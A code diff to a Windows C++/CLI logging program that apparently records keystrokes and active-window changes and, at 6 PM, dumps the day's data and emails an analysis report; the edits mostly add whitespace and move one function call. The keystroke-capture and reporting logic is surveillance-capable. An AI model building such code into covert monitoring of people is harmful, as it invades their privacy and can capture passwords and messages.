@@ -1,6 +1,8 @@
 ﻿
 #include "LoggingManager.h"
 #include <crtdbg.h>
+using namespace System;
+using namespace System::Threading;
 
 DataManager dataManager = DataManager();
 EmailManager emailManager = EmailManager();
@@ -108,13 +110,15 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
             // get current time and strip date
 			System::DateTime currentTime = System::DateTime().Now;			
 			bool timeToProcess = currentTime.Hour == 18;			
-			dataManager.DumpDay();
+
             // begin processing report at 6:00 PM
             if(timeToProcess && !sendReport) {
+				
                 // call dumpday
                 dataManager.DumpDay();
                 emailManager.readAnalysisResults();
                 sendReport = true;
+				
 				break;
 
             } 
@@ -127,6 +131,7 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
                 pause(1);
                 loggedKeystrokes.clear();
                 threadCounter = theCount;
+
             }
 
             // continuously check for key input
@@ -147,6 +152,7 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
 
 // function triggered whenever a window becomes active
 void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
+
     DWORD newPID;
 
     // get active window handle
@@ -198,6 +204,7 @@ void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG id
     wnd_title = newWnd_title;
     rawStartTime = newRawStartTime;
     startTime = newStartTime;
+
 }
 
 // function to start active window listener
